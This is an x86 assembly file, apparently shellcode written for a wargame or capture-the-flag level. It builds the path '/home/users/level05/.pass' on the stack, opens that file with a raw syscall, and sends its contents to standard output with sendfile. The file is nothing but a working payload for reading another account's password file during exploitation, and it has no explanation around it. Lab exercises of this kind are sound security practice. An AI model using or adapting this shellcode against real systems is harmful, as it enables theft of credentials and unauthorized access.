section .text
global _start

.pass

_start:

    push dword 0x00000073 ; "s"
    push dword 0x7361702e ; ".pas"
    push dword 0x2f35306c ; "l05/"
    push dword 0x6576656c ; "leve"
    push dword 0x2f737265 ; "ers/"
    push dword 0x73752f65 ; "e/us"
    push dword 0x6d6f682f ; "/hom"


    mov ebx, esp
    xor ecx, ecx

    push dword 0x00000005
    pop eax
    int 0x80

    push dword 0x00000001
    pop ebx

    mov ecx, eax
    xor edx, edx

    push dword 0x10000
    pop esi

    xor eax, eax
    mov al, 0xbb

    int 0x80